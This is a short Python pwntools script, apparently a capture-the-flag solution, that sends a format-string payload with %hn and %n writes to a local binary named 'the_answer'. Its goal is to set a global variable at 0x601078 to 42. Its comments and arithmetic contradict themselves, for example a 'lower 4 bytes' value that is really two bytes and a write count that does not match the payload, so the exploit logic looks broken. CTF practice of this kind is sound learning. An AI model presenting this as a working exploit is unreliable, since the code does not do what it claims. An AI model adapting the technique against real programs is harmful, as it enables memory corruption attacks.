#!/usr/bin/env python3
from pwn import *

# Set up the binary
context.binary = binary = './the_answer'
p = process(binary)

# Address breakdown (avoiding NULL bytes)
answer_addr = 0x601078
addr_low = answer_addr & 0xffff      # 0x1078 (no NULL bytes)
addr_high = (answer_addr >> 16) & 0xffff  # 0x0060 (contains NULL)

# Solution: Use only the non-NULL portion we can write
# We'll take advantage of the fact that higher memory is often zero-filled

def overwrite_answer():
    # We'll use the fact that x86-64 addresses often have leading NULLs
    # So we only need to write the lower 4 bytes (0x00006010)
    
    # Step 1: Write the partial address (0x1078)
    payload = p16(addr_low)          # \x78\x10
    payload += b'%8$hn'              # Write to 8th argument
    
    # Step 2: The %n write will go to 0x0000000000601078
    # (assuming higher bytes are zero)
    bytes_written = 6                # 2 addr + 4 fmt
    bytes_needed = 42 - bytes_written
    payload += f'%{bytes_needed}c%9$n'.encode()
    
    # Pad to maintain alignment
    payload = payload.ljust(64, b'P')
    
    print("NULL-free payload:", payload)
    print("Payload", payload)
    
    # Send the payload
    p.sendlineafter(b"What's your name?\n", payload)
    
    p.interactive()

overwrite_answer()
